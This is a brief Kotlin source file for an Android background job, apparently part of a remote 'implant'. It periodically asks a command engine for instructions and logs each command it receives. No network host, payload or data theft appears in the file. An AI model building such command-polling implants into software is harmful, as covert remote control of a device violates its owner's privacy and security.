package com.cooperthecoder.implant.jobs

import android.util.Log
import com.evernote.android.job.Job

class CheckForCommandsJob : Job() {

    companion object {
        const val JOB_NAME = "check_commands"
        val TAG = CheckForCommandsJob::class.java.name
    }

    override fun onRunJob(params: Params): Result {
        val engine = CheckForCommandsEngine(context)
        val command = engine.action()
        Log.d(TAG, "Command received: $command")
        return Result.SUCCESS
    }

}